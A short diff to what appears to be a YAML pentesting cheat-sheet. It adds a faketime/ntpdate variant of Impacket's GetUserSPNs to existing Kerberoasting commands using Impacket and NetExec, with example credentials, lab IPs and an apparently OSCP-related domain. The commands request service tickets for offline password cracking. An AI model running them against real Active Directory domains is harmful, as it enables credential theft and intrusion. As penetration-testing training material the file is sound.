@@ -6,6 +6,8 @@ commands:
     cmd: |
       # Request TGS tickets for all SPNs (Impacket)
       impacket-GetUserSPNs senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -request -outputfile hashes.kerberoast
+      # with ntpdate
+      faketime "$(ntpdate -q 10.10.168.152 | cut -d ' ' -f 1,2)" impacket-GetUserSPNs -request -dc-ip 10.10.168.152 oscp.exam/web_svc
 
       # Kerberoasting via NetExec
       nxc ldap 10.10.10.27 -u sec_user -p 'P@ssw0rd' --kerberoasting output.txt
